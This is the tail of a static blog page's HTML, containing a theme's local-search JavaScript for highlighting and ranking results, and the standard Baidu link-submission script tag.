                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  

  

  

  

</body>
</html>
